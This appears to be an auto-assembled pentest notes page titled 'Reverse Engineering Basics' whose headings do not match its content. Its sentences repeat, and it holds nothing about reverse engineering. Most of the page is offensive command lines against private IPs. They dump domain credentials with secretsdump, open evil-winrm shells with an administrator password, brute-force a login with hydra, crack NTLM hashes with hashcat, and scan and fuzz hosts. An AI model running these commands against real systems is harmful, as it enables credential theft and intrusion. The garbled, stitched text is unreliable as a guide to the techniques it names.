---
TitleSEO: "Reverse Engineering Basics | ZureFX"
TitlePost: "Reverse Engineering Basics"
Author: "ZureFX"
Description: "Personal notes on Reverse Engineering Basics. Quick reference for pentesting and CTF challenges."
Keywords: "windows, enumeration, lateral movement, dfir, cheatsheet, blue team"
URL: "https://zurefx.github.io/notes/note-reverse-engineering-basics-203.html"
URL_IMAGES: ""
Date: "2024-11-11"
Tags: "Windows, Enumeration, Lateral Movement, DFIR, Cheatsheet, Blue Team"
Section: "notes"
Lang: "en"
main_img: "note-reverse-engineering-basics-203"
Permalink: "/notes/note-reverse-engineering-basics-203.html"
BtnLabel: "Read Notes"
Pick: 0
---
## wpscan

### ffuf

```bash
crackmapexec smb 10.104.12.191 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p135,464,3389 10.52.48.94 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.19.52.40
gobuster dir -u http://10.43.228.160/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory.

- `ligolo-ng`
- `CSRF`
- `ldapsearch`
- `Docker Escape`

```bash
evil-winrm -i 10.55.174.105 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.90.48.87 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.99.40.129/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```powershell
nmap -sCV -p21,3389,445 10.51.32.98 -oN scan.txt
```

## enum4linux

### gobuster

The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
nmap -sCV -p21,25,53 10.121.217.114 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.72.184.106
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.75.38.49/FUZZ
```

The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.99.144.193
gobuster dir -u http://10.119.110.148/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.27.194.218 -u administrator -p 'P@ssw0rd!'
```

- `DNS Rebinding`
- `enum4linux`
- `ligolo-ng`
- `XSS`
- `rubeus`
- `feroxbuster`

## DLL Hijacking

### lookupsid

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.17.39.13 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.93.178 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.72.250.49
```

```bash
evil-winrm -i 10.36.226.119 -u administrator -p 'P@ssw0rd!'
```

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code.

## Python

### GetUserSPNs

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `LXD Privilege Escalation`
- `GetNPUsers`
- `AlwaysInstallElevated`

```powershell
nmap -sCV -p389,53,5985 10.61.244.125 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.114.240.11/FUZZ
feroxbuster -h
```

```powershell
evil-winrm -i 10.127.107.150 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.101.229.135/FUZZ
```

## Golden Ticket

### wmiexec

Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

- `kerbrute`
- `XXE`
- `ffuf`
- `secretsdump`
- `LXD Privilege Escalation`
- `Constrained Delegation`

## dcomexec

### LXD Privilege Escalation

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.96.175.23
```

```bash
evil-winrm -i 10.98.130.6 -u administrator -p 'P@ssw0rd!'
```
